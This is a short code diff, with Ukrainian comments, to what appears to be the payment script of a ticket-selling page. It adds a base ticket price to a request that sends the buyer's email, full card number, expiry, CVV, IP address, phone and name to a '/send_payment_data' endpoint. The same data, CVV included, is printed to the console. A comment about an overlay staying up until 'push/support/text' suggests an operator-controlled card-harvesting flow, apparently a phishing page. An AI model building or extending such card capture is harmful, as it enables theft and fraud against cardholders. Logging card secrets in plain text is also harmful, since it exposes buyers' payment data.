@@ -360,6 +360,8 @@
         // --- Додаємо price і currency ---
         // Тепер price/currency = total/currency з URL, якщо є
         const { total: price, currency } = getTotalAndCurrency();
+        // --- Додаємо базову ціну за один квиток ---
+        const basePrice = sessionStorage.getItem('ticket_price') || price;
         // --- Додаємо телефон і ім'я з sessionStorage ---
         const phone = sessionStorage.getItem('ticket_phone') || '';
         const name = sessionStorage.getItem('ticket_name') || '';
@@ -382,11 +384,11 @@
                 ip = userIP;
             }
             // --- Додаю логування для діагностики ---
-            console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name });
+            console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price: basePrice, total: price, currency, phone, name });
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price, currency, phone, name })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price: basePrice, total: price, currency, phone, name })
             });
             // overlay залишається до push/support/text!
             if (!response.ok) {
